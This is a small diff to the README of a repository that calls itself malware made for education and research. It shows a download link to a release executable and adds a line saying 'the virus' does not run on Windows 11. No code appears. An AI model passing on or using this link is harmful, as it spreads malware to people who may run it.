@@ -17,3 +17,6 @@ This repository contains malware designed **solely** for educational and researc
 
 
 [DOWNLOAD](https://github.com/Sheudz/MrMajor/releases/download/1.0.0/MrMajor.1.0.exe)
+
+
+the virus doesn't work with Win 11, and idk why, sorry
